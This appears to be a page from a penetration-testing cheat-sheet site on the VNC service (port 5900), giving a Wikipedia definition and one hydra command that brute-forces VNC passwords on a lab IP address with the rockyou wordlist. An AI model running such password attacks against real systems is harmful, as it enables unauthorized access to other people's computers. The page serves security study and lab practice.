---
layout: default
title: VNC (5900)
nav_order: 1
parent: Services
permalink: /docs/services/vnc
---

# VNC

> Virtual Network Computing is a graphical desktop-sharing system that uses the Remote Frame Buffer protocol to remotely control another computer. It transmits the keyboard and mouse input from one computer to another, relaying the graphical-screen updates, over a network. - Wikipedia

## Bruteforcing
```
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt -t 16 10.10.175.32 vnc
```